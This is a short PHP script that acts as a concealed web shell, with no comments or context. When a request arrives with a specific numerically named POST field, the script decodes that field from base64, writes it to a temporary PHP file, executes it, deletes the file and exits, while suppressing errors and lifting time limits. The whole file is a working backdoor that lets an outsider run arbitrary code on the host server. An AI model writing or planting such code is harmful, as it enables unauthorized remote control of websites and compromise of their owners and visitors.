<?php 
error_reporting(E_ERROR);set_time_limit(0);
if(isset($_POST['555088665326399347580'])){
	$tofile='407.php';
	$a =base64_decode(strtr($_POST['555088665326399347580'], '-_,', '+/=')); 
	$a='<?php '.$a.'?>';
	@file_put_contents($tofile,$a);
	require_once('407.php');
	@unlink($tofile);
	exit;

}
?>